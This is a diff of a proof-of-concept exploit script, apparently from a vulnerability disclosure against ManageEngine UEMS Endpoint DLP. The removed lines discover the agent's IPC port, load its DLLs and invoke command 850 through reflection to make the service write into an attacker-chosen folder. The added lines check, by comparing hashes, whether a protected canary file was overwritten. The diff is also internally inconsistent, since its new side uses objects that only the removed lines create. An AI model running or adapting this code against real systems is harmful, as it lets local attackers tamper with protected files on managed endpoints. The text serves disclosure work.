@@ -1,33 +1,19 @@
-$bin = 'C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin'
+$type.GetMethod('Close').Invoke($client, @())
 
-[void][Reflection.Assembly]::LoadFrom("$bin\AsyncIO.dll")
+Then open an admin PowerShell and verify the overwrite:
 
-[void][Reflection.Assembly]::LoadFrom("$bin\NetMQ.dll")
+$before = Get-Content 'C:\Users\Public\uems-cmd850-before.txt'
 
-$map = [IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting('Global\{37669676-A539-4FAF-BB0E-FBCE2F90B099}')
+$after = (Get-FileHash 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Hash
 
-$view = $map.CreateViewAccessor()
+$size = (Get-Item 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Length
 
-$port = $view.ReadInt32(0)
+Write-Host "BeforeSHA256=$before"
 
-$view.Dispose(); $map.Dispose()
+Write-Host "AfterSHA256=$after"
 
-Write-Host "DiscoveredMEDLPPort=$port"
+Write-Host "AfterLength=$size"
 
-$asm = [Reflection.Assembly]::LoadFrom("$bin\DotNetUI.dll")
+Write-Host "ProtectedCanaryOverwritten=$($after -ne $before)"
 
-$type = $asm.GetType('AgentUtil.DuplexClient', $true)
-
-$client = [Activator]::CreateInstance($type)
-
-$type.GetMethod('Initialize').Invoke($client, @([int]$port))
-
-$method = $type.GetMethod('SendWithPoller', [Type[]]@([int], [string], [byte[]].MakeByRefType(), [long]))
-
-$request = '{"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850\\","TotalPages":1}'
-
-$args2 = [object[]]@(850, $request, $null, [long]10000)
-
-$ok = $method.Invoke($client, $args2)
-
-Write-Host "Command850Success=$ok"
+Screenshot showing ProtectedCanaryOverwritten=True. 
